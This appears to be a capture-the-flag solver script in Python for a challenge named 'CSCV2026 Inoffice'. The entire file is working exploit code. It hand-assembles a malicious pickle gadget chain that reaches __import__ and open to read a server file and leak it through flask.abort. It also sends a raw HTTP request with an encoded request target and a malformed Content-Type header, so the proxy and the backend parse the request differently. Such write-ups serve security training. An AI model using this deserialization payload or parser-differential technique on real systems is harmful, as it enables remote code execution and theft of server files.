#!/usr/bin/env python3
"""CSCV2026 Inoffice parser-differential solver.

The request target and Content-Type are intentionally sent as raw bytes so
the proxy and the backend do not normalize them in the same way.
"""

import argparse
import re
import socket
from urllib.parse import urlsplit


BOUNDARY = b"----inoffice-boundary"
VHOST = b"mmoffice.x.corp"


def global_ref(name: str) -> bytes:
    return b"c" + b"builtins\n" + name.encode("ascii") + b"\n"


def short_string(value: str) -> bytes:
    raw = value.encode("utf-8")
    if len(raw) > 255:
        raise ValueError("pickle string is too long")
    return b"\x8c" + bytes([len(raw)]) + raw


def build_pickle(flag_path: str) -> bytes:
    payload = bytearray(b"\x80\x04")
    payload += global_ref("globals") + b")R\x94" + b"0"
    payload += global_ref("getattr") + b"h\x00" + short_string("get") + b"\x86R\x94" + b"0"
    payload += b"h\x01" + short_string("__builtins__") + b"\x85R\x94" + b"0"
    payload += global_ref("getattr") + b"h\x02" + short_string("get") + b"\x86R\x94" + b"0"
    payload += b"h\x03" + short_string("__import__") + b"\x85R\x94" + b"0"
    payload += b"h\x04" + short_string("flask") + b"\x85R\x94" + b"0"
    payload += global_ref("getattr") + b"h\x05" + short_string("abort") + b"\x86R\x94" + b"0"
    payload += global_ref("open") + short_string(flag_path) + b"\x85R\x94" + b"0"
    payload += global_ref("getattr") + b"h\x07" + short_string("read") + b"\x86R\x94" + b"0"
    payload += b"h\x08)R\x94" + b"0"
    payload += b"h\x06(M\x90\x01h\x09tR."
    return bytes(payload)


def build_multipart(payload: bytes) -> bytes:
    return (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="work.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        + payload
        + b"\r\n--" + BOUNDARY + b"--\r\n"
    )


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="http://HOST:PORT/ or https://HOST:PORT/")
    parser.add_argument("--flag-path", default="/flag.txt")
    args = parser.parse_args()

    parsed = urlsplit(args.target)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise SystemExit("target must be an http(s) URL")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    body = build_multipart(build_pickle(args.flag_path))
    request_target = b"http:%6f%66%66%69%63%65-process?@mmoffice.x.corp"
    request = (
        b"POST " + request_target + b" HTTP/1.1\r\n"
        b"Host: " + VHOST + b"\r\n"
        b"Content-Type: \x0bmultipart/form-data; boundary=" + BOUNDARY + b"\r\n"
        + f"Content-Length: {len(body)}\r\n".encode()
        + b"Connection: close\r\n\r\n"
        + body
    )
    with socket.create_connection((parsed.hostname, port), timeout=8) as sock:
        sock.sendall(request)
        response = b"".join(iter(lambda: sock.recv(4096), b""))
    print(response.decode("utf-8", "replace"))
    match = re.search(rb"CSCV(?:2026)?\{[^}\r\n]+\}", response)
    if not match:
        raise SystemExit("flag not found")
    print("FLAG:", match.group().decode())


if __name__ == "__main__":
    main()
